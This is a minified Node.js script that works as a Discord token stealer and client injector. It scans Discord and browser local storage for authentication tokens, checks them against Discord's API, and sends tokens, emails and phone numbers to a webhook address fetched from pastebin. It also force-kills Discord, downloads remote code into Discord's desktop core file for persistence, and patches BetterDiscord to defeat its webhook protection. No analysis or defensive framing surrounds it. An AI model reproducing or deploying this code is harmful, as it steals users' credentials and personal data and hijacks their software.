const fs=require("fs"),axios=require("axios"),fetch=require("node-fetch"),webhook=async()=>(await axios.get("https://pastebin.com/raw/Su4ip2LB").catch((()=>{}))).data;var paths=[`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Discord/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Lightcord/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordptb/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Amigo/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Torch/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/discordcanary/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Kometa/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Orbitum/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/CentBrowser/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/7Star/7Star/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Vivaldi/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Sputnik/Sputnik/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome SxS/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Epic Privacy Browser/User Data/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/uCozMedia/Uran/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Roaming/Opera Software/Opera GX Stable/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/Opera Software/Opera Neon/User Data/Default/Local Storage/leveldb`,`${__dirname.split(":")[0]}:/Users/${__dirname.split("\\")[2]}/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb`];for(i=0;i<paths.length;i++)get_token(paths[i]);async function get_token(e){try{fs.readdir(e,((a,r)=>{if(void 0!==r){var t=r.filter((e=>"ldb"===e.split(".").pop()));for(i=0;i<t.length;i++)fs.readFile(`${e}/${t[i]}`,"utf-8",(async function(e,a){let[r]=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/.exec(a)||/"mfa\.[\d\w_-]{84}"/.exec(a)||[null];null!=r&&(r=r.replace(/"/g,""),await fetch("https://discord.com/api/v6/users/@me",{headers:{authorization:r}}).then((e=>e.json())).then((e=>{e.id&&(e.premium_type?(1===e.premium_type&&(nitro="Nitro Classic"),2===e.premium_type&&(nitro="Nitro Gaming")):nitro="Sem nitro",send(r,e.id,e.username,e.discriminator,e.email,e.phone,nitro,e.avatar))})))}))}})),fs.readdir(e,((a,r)=>{if(void 0!==r){var t=r.filter((e=>"log"===e.split(".").pop()));for(i=0;i<t.length;i++)fs.readFile(`${e}/${t[i]}`,"utf-8",(async function(e,a){let r=/"[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}"/;r.test(a);let[i]=r.exec(a)||/"mfa\.[\d\w_-]{84}"/.exec(a)||[null];null!=i&&(i=i.replace(/"/g,""),await fetch("https://discord.com/api/v6/users/@me",{headers:{authorization:i}}).then((e=>e.json())).then((e=>{e.id&&(e.premium_type?(1===e.premium_type&&(nitro="Nitro Classic"),2===e.premium_type&&(nitro="Nitro Gaming")):nitro="Sem nitro",send(i,e.id,e.username,e.discriminator,e.email,e.phone,nitro))})))}))}}))}catch(e){console.log(e)}}async function send(e,a,r,i,t,s,o,l){null===t&&(t="Sem email"),null===s&&(s="Sem telefone"),l=null===l?"https://cdn.discordapp.com/attachments/712856393245392897/743945577238364160/discord.jpg":`https://cdn.discordapp.com/avatars/${a}/${l}.png`;var n=await webhook();axios.post(n,{embeds:[{color:0,thumbnail:{url:`${l}`},description:`\n                **Iniciou**\n\n                **Nome**\n\`${r}#${i}\`\n                **ID**\n\`${a}\`\n                **Email**\n\`${t}\`\n                **Tell**\n\`${s}\`\n                \n                **Token**\n                \`\`\`${e}\`\`\``}],username:"Vilao"},{headers:{"Content-Type":"application/json"}})}var glob=require("glob");const https=require("https"),{exec:exec}=require("child_process"),buf_replace=require("buffer-replace"),linkhook="%WEBHOOK_LINK%";var LOCAL=process.env.LOCALAPPDATA,discords=[],injectPath=[],runningDiscords=[];function Infect(){https.get("https://pastebin.com/raw/HMgsiG4k",(e=>{let a="";e.on("data",(e=>{a+=e})),e.on("end",(()=>{injectPath.forEach((e=>{fs.writeFileSync(e,a.replace("%WEBHOOK_LINK%",linkhook),{encoding:"utf8",flag:"w"});let r=e.replace("index.js","core");fs.existsSync(r)||(fs.mkdirSync(r,484),startDiscord())}))}))})).on("error",(e=>{console.log(e,main)}))}function listDiscords(){exec("tasklist",(function(e,a,r){a.includes("Discord.exe")&&runningDiscords.push("Discord"),a.includes("DiscordCanary.exe")&&runningDiscords.push("DiscordCanary"),a.includes("DiscordPTB.exe")&&runningDiscords.push("DiscordPTB"),killDiscord()}))}function killDiscord(){runningDiscords.forEach((e=>{exec(`taskkill /IM ${e}.exe /F`,(e=>{}))})),Infect(),pwnBetterDiscord()}function startDiscord(){runningDiscords.forEach((e=>{path=LOCAL+"\\"+e+"\\Update.exe",exec(`${path} --processStart ${e}.exe`,(e=>{}))}))}function pwnBetterDiscord(){var e=process.env.appdata+"\\BetterDiscord\\data\\betterdiscord.asar";if(fs.existsSync(e)){var a=fs.readFileSync(e);fs.writeFileSync(e,buf_replace(a,"api/webhooks","stanleyisgod"))}}fs.readdirSync(LOCAL).forEach((e=>{e.includes("iscord")&&discords.push(LOCAL+"\\"+e)})),discords.forEach((function(e){let a=`${e}\\app-*\\modules\\discord_desktop_core-*\\discord_desktop_core\\index.js`;glob.sync(a).map((e=>{injectPath.push(e),listDiscords()}))}));